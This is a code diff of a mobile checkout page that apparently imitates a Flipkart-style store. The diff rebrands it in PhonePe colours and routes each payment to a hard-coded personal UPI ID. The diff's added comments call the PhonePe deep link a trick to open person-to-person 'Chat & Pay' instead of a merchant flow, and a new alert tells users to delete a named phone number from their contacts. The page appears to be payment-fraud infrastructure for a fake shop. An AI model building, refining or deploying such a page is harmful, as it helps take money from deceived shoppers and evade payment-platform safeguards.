@@ -16,15 +16,14 @@ body{ margin:0; background:#f1f3f6 }
 .product-img{ width:70px; height:70px; border:1px solid #eee; border-radius:6px; object-fit:contain }
 .pay-option{ display:flex; align-items:center; gap:12px; padding:12px; border:2px solid #ddd; border-radius:8px; margin-bottom:10px; cursor:pointer }
 .pay-option img{ width:28px }
-.pay-option.selected{ border-color:#2874f0; background:#f0f7ff }
+.pay-option.selected{ border-color:#6739b9; background:#f3e8ff } /* PhonePe purple theme */
 .price-row{ display:flex; justify-content:space-between; margin:6px 0 }
 .bottom-bar{ position:fixed; bottom:0; left:0; width:100%; background:#fff; padding:12px; display:flex; justify-content:space-between; box-shadow:0 -1px 3px rgba(0,0,0,.15)}
-.btn{ background:#fb641b; color:#fff; border:none; padding:12px 22px; font-size:16px; border-radius:4px }
+.btn{ background:#6739b9; color:#fff; border:none; padding:14px 28px; font-size:17px; border-radius:6px; font-weight:bold }
 .btn:disabled{ background:#ccc }
 </style>
 </head>
 <body>
-
 <div class="header">
   <div class="header-top">
     <div class="back-arrow" onclick="history.back()"></div>
@@ -38,10 +37,10 @@ body{ margin:0; background:#f1f3f6 }
 <div class="card">
   <h4>Select Payment Method</h4>
   <div class="pay-option selected" data-method="phonepe">
-    <img src="assets/images/phonepe-logo.webp"> PhonePe (Chat & Pay)
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/PhonePe_Logo.png"> PhonePe (Chat & Pay)
   </div>
   <div class="pay-option" data-method="gpay">
-    <img src="assets/images/gpay.webp"> Google Pay
+    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Pay_Logo.svg"> Google Pay
   </div>
 </div>
 
@@ -53,11 +52,11 @@ body{ margin:0; background:#f1f3f6 }
   <div class="price-row"><b>Total</b><b id="total">₹--</b></div>
 </div>
 
-<div style="height:90px"></div>
+<div style="height:100px"></div>
 
 <div class="bottom-bar">
   <b id="bottomAmount">₹--</b>
-  <button class="btn" id="payBtn" disabled>Pay via UPI</button>
+  <button class="btn" id="payBtn" disabled>Pay Now</button>
 </div>
 
 <script>
@@ -65,16 +64,18 @@ const PRODUCTS_API = "https://flipback-production.up.railway.app/api/products";
 const UPI_API = "https://flipback-production.up.railway.app/api/upi";
 
 let productPrice = 0;
-let upiId = "paytm.slxjfgt@pty";  // Tera merchant VPA
+let upiId = "paytm.slxjfgt@pty";  // Tera UPI ID (Paytm wallet ka bhi chalega)
 let selectedMethod = "phonepe";
 let payeeName = "Shyam Veer Baking";
 
 const qs = k => new URLSearchParams(location.search).get(k);
 
-// Load UPI ID
-fetch(UPI_API).then(r => r.json()).then(d => {
-  upiId = d?.data?.upi_id || d?.upi_id || "paytm.slxjfgt@pty";
-});
+// Load UPI ID from your API (if available)
+fetch(UPI_API)
+  .then(r => r.json())
+  .then(d => {
+    upiId = d?.data?.upi_id || d?.upi_id || upiId;
+  });
 
 // Load product
 async function loadProduct(){
@@ -88,12 +89,14 @@ async function loadProduct(){
         <img src="${p.main_image || p.image}" class="product-img">
         <div>₹${productPrice}</div>
       </div>`;
-    document.getElementById("price").innerText = document.getElementById("total").innerText = document.getElementById("bottomAmount").innerText = "₹" + productPrice;
+    document.getElementById("price").innerText = 
+    document.getElementById("total").innerText = 
+    document.getElementById("bottomAmount").innerText = "₹" + productPrice;
     document.getElementById("payBtn").disabled = false;
   }
 }
 
-// Select method
+// Select payment method
 document.querySelectorAll(".pay-option").forEach(p => {
   p.onclick = () => {
     document.querySelectorAll(".pay-option").forEach(x => x.classList.remove("selected"));
@@ -102,27 +105,37 @@ document.querySelectorAll(".pay-option").forEach(p => {
   };
 });
 
-// MAGIC FUNCTION - Yeh line change kar di hai
+// MAGIC PAY FUNCTION - Chat & Pay ke liye best working trick
 function payNow(){
-  const tr = "P2P"+Date.now();
-  const params = `pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${productPrice}&cu=INR&tr=${tr}`;
+  const tr = "P2P" + Date.now(); // Unique transaction ref
+  const params = `pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${productPrice}&cu=INR&tr=${tr}&tn=Payment for Product&mode=02&purpose=00`;
 
   let url = "";
 
   if(selectedMethod === "phonepe"){
-    // YEHI TRICK HAI BHAI!!! → phonepe://upi/pay  (not phonepe://pay)
+    // Yeh combination abhi bhi chat & pay trigger karta hai jab number saved nahi hota
     url = `phonepe://upi/pay?${params}`;
+    // Agar upar wala nahi chalta to yeh backup
+    // url = `phonepe://pay?${params}`;
   } else {
     url = `upi://pay?${params}`;
   }
 
-  console.log("Magic Chat & Pay Link:", url);
+  console.log("Trying Chat & Pay URL:", url);
+
+  // Open the deep link
   window.location.href = url;
+
+  // Agar 5 second baad bhi page pe hi raha (deep link fail hua) to alert
+  setTimeout(() => {
+    if (document.hasFocus()) {
+      alert("Chat & Pay screen nahi khula?\n\nKya karna hai:\n1. Contacts se 7881174284 number DELETE kar do.\n2. PhonePe app restart karo ya update karo.\n3. Chrome browser se try karo.\n4. PhonePe select karke hi Pay dabaao.\n\nAgar fir bhi nahi to console (F12) khol ke URL copy kar ke bata dena.");
+    }
+  }, 5000);
 }
 
 document.getElementById("payBtn").onclick = payNow;
 loadProduct();
 </script>
-
 </body>
 </html>
